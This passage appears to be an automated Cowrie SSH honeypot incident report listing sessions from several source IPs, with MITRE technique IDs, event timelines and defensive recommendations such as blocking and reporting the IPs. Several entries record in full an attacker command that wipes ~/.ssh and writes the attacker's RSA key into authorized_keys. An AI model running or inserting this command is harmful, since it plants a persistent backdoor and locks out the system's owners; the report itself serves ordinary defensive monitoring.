| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:12:38` | `cowrie.session.connect` |
| `2026-06-10 08:12:38` | `cowrie.client.version` |
| `2026-06-10 08:12:38` | `cowrie.client.kex` |
| `2026-06-10 08:12:38` | `cowrie.login.success` |
| `2026-06-10 08:12:39` | `cowrie.session.params` |
| `2026-06-10 08:12:39` | `cowrie.command.input` |
| `2026-06-10 08:12:39` | `cowrie.command.failed` |
| `2026-06-10 08:12:39` | `cowrie.log.closed` |
| `2026-06-10 08:12:39` | `cowrie.session.params` |
| `2026-06-10 08:12:39` | `cowrie.command.input` |
| `2026-06-10 08:12:39` | `cowrie.session.file_download` |
| `2026-06-10 08:12:39` | `cowrie.log.closed` |
| `2026-06-10 08:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.71.92[.]229` to AbuseIPDB if not already reported
- [ ] Block `13.71.92[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ac7dda9dcd

| Field | Detail |
|---|---|
| **Source IP** | `13.71.92[.]229` |
| **First Seen** | 2026-06-10 08:12 |
| **Last Seen** | 2026-06-10 08:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:12:40` | `cowrie.session.connect` |
| `2026-06-10 08:12:40` | `cowrie.client.version` |
| `2026-06-10 08:12:40` | `cowrie.client.kex` |
| `2026-06-10 08:12:40` | `cowrie.login.success` |
| `2026-06-10 08:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.71.92[.]229` to AbuseIPDB if not already reported
- [ ] Block `13.71.92[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e79df40330f

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-10 08:13 |
| **Last Seen** | 2026-06-10 08:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:13:11` | `cowrie.session.connect` |
| `2026-06-10 08:13:11` | `cowrie.client.version` |
| `2026-06-10 08:13:11` | `cowrie.client.kex` |
| `2026-06-10 08:13:11` | `cowrie.login.success` |
| `2026-06-10 08:13:12` | `cowrie.session.params` |
| `2026-06-10 08:13:12` | `cowrie.command.input` |
| `2026-06-10 08:13:12` | `cowrie.command.failed` |
| `2026-06-10 08:13:12` | `cowrie.log.closed` |
| `2026-06-10 08:13:12` | `cowrie.session.params` |
| `2026-06-10 08:13:12` | `cowrie.command.input` |
| `2026-06-10 08:13:12` | `cowrie.session.file_download` |
| `2026-06-10 08:13:12` | `cowrie.log.closed` |
| `2026-06-10 08:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5cc81119443

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-10 08:13 |
| **Last Seen** | 2026-06-10 08:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:13:14` | `cowrie.session.connect` |
| `2026-06-10 08:13:14` | `cowrie.client.version` |
| `2026-06-10 08:13:14` | `cowrie.client.kex` |
| `2026-06-10 08:13:15` | `cowrie.login.success` |
| `2026-06-10 08:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4abf5f6b2df9

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:24 |
| **Last Seen** | 2026-06-10 08:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:24:36` | `cowrie.session.connect` |
| `2026-06-10 08:24:36` | `cowrie.client.version` |
| `2026-06-10 08:24:36` | `cowrie.client.kex` |
| `2026-06-10 08:24:37` | `cowrie.login.success` |
| `2026-06-10 08:24:37` | `cowrie.session.params` |
| `2026-06-10 08:24:37` | `cowrie.command.input` |
| `2026-06-10 08:24:37` | `cowrie.command.failed` |
| `2026-06-10 08:24:38` | `cowrie.log.closed` |
| `2026-06-10 08:24:38` | `cowrie.session.params` |
| `2026-06-10 08:24:38` | `cowrie.command.input` |
| `2026-06-10 08:24:38` | `cowrie.session.file_download` |
| `2026-06-10 08:24:38` | `cowrie.log.closed` |
| `2026-06-10 08:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3819d7f1b30

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:24 |
| **Last Seen** | 2026-06-10 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:24:41` | `cowrie.session.connect` |
| `2026-06-10 08:24:41` | `cowrie.client.version` |
| `2026-06-10 08:24:41` | `cowrie.client.kex` |
| `2026-06-10 08:24:42` | `cowrie.login.success` |
| `2026-06-10 08:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0cd97e4a387

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:26 |
| **Last Seen** | 2026-06-10 08:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:26:58` | `cowrie.session.connect` |
| `2026-06-10 08:26:58` | `cowrie.client.version` |
| `2026-06-10 08:26:58` | `cowrie.client.kex` |
| `2026-06-10 08:26:59` | `cowrie.login.success` |
| `2026-06-10 08:26:59` | `cowrie.session.params` |
| `2026-06-10 08:26:59` | `cowrie.command.input` |
| `2026-06-10 08:26:59` | `cowrie.command.failed` |
| `2026-06-10 08:26:59` | `cowrie.log.closed` |
| `2026-06-10 08:26:59` | `cowrie.session.params` |
| `2026-06-10 08:26:59` | `cowrie.command.input` |
| `2026-06-10 08:27:00` | `cowrie.session.file_download` |
| `2026-06-10 08:27:00` | `cowrie.log.closed` |
| `2026-06-10 08:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dcd5afb67f6

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:27 |
| **Last Seen** | 2026-06-10 08:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:27:02` | `cowrie.session.connect` |
| `2026-06-10 08:27:02` | `cowrie.client.version` |
| `2026-06-10 08:27:02` | `cowrie.client.kex` |
| `2026-06-10 08:27:03` | `cowrie.login.success` |
| `2026-06-10 08:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc1e716b0842

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:27 |
| **Last Seen** | 2026-06-10 08:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:27:50` | `cowrie.session.connect` |
| `2026-06-10 08:27:50` | `cowrie.client.version` |
| `2026-06-10 08:27:50` | `cowrie.client.kex` |
| `2026-06-10 08:27:51` | `cowrie.login.success` |
| `2026-06-10 08:27:52` | `cowrie.session.params` |
| `2026-06-10 08:27:52` | `cowrie.command.input` |
| `2026-06-10 08:27:52` | `cowrie.command.failed` |
| `2026-06-10 08:27:52` | `cowrie.log.closed` |
| `2026-06-10 08:27:52` | `cowrie.session.params` |
| `2026-06-10 08:27:52` | `cowrie.command.input` |
| `2026-06-10 08:27:52` | `cowrie.session.file_download` |
| `2026-06-10 08:27:52` | `cowrie.log.closed` |
| `2026-06-10 08:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73005e33c8fe

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:27 |
| **Last Seen** | 2026-06-10 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:27:55` | `cowrie.session.connect` |
| `2026-06-10 08:27:55` | `cowrie.client.version` |
| `2026-06-10 08:27:55` | `cowrie.client.kex` |
| `2026-06-10 08:27:56` | `cowrie.login.success` |
| `2026-06-10 08:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14b2f095b75

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:28 |
| **Last Seen** | 2026-06-10 08:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:28:39` | `cowrie.session.connect` |
| `2026-06-10 08:28:39` | `cowrie.client.version` |
| `2026-06-10 08:28:39` | `cowrie.client.kex` |
| `2026-06-10 08:28:40` | `cowrie.login.success` |
| `2026-06-10 08:28:41` | `cowrie.session.params` |
| `2026-06-10 08:28:41` | `cowrie.command.input` |
| `2026-06-10 08:28:41` | `cowrie.command.failed` |
| `2026-06-10 08:28:41` | `cowrie.log.closed` |
| `2026-06-10 08:28:41` | `cowrie.session.params` |
| `2026-06-10 08:28:41` | `cowrie.command.input` |
| `2026-06-10 08:28:42` | `cowrie.session.file_download` |
| `2026-06-10 08:28:42` | `cowrie.log.closed` |
| `2026-06-10 08:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9810a96d180

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:28 |
| **Last Seen** | 2026-06-10 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:28:44` | `cowrie.session.connect` |
| `2026-06-10 08:28:44` | `cowrie.client.version` |
| `2026-06-10 08:28:44` | `cowrie.client.kex` |
| `2026-06-10 08:28:45` | `cowrie.login.success` |
| `2026-06-10 08:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64472709f837

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:30 |
| **Last Seen** | 2026-06-10 08:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:30:58` | `cowrie.session.connect` |
| `2026-06-10 08:30:58` | `cowrie.client.version` |
| `2026-06-10 08:30:58` | `cowrie.client.kex` |
| `2026-06-10 08:30:59` | `cowrie.login.success` |
| `2026-06-10 08:30:59` | `cowrie.session.params` |
| `2026-06-10 08:30:59` | `cowrie.command.input` |
| `2026-06-10 08:30:59` | `cowrie.command.failed` |
| `2026-06-10 08:31:00` | `cowrie.log.closed` |
| `2026-06-10 08:31:00` | `cowrie.session.params` |
| `2026-06-10 08:31:00` | `cowrie.command.input` |
| `2026-06-10 08:31:00` | `cowrie.session.file_download` |
| `2026-06-10 08:31:00` | `cowrie.log.closed` |
| `2026-06-10 08:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30065d2e58f

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:31 |
| **Last Seen** | 2026-06-10 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:31:03` | `cowrie.session.connect` |
| `2026-06-10 08:31:03` | `cowrie.client.version` |
| `2026-06-10 08:31:03` | `cowrie.client.kex` |
| `2026-06-10 08:31:04` | `cowrie.login.success` |
| `2026-06-10 08:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b7bea7924e

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:34 |
| **Last Seen** | 2026-06-10 08:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:34:16` | `cowrie.session.connect` |
| `2026-06-10 08:34:16` | `cowrie.client.version` |
| `2026-06-10 08:34:17` | `cowrie.client.kex` |
| `2026-06-10 08:34:18` | `cowrie.login.success` |
| `2026-06-10 08:34:18` | `cowrie.session.params` |
| `2026-06-10 08:34:18` | `cowrie.command.input` |
| `2026-06-10 08:34:18` | `cowrie.command.failed` |
| `2026-06-10 08:34:18` | `cowrie.log.closed` |
| `2026-06-10 08:34:19` | `cowrie.session.params` |
| `2026-06-10 08:34:19` | `cowrie.command.input` |
| `2026-06-10 08:34:19` | `cowrie.session.file_download` |
| `2026-06-10 08:34:19` | `cowrie.log.closed` |
| `2026-06-10 08:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c77c838a8d

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:34 |
| **Last Seen** | 2026-06-10 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:34:22` | `cowrie.session.connect` |
| `2026-06-10 08:34:22` | `cowrie.client.version` |
| `2026-06-10 08:34:22` | `cowrie.client.kex` |
| `2026-06-10 08:34:23` | `cowrie.login.success` |
| `2026-06-10 08:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28d99bc84e7

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:35 |
| **Last Seen** | 2026-06-10 08:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:35:26` | `cowrie.session.connect` |
| `2026-06-10 08:35:26` | `cowrie.client.version` |
| `2026-06-10 08:35:26` | `cowrie.client.kex` |
| `2026-06-10 08:35:27` | `cowrie.login.success` |
| `2026-06-10 08:35:27` | `cowrie.session.params` |
| `2026-06-10 08:35:27` | `cowrie.command.input` |
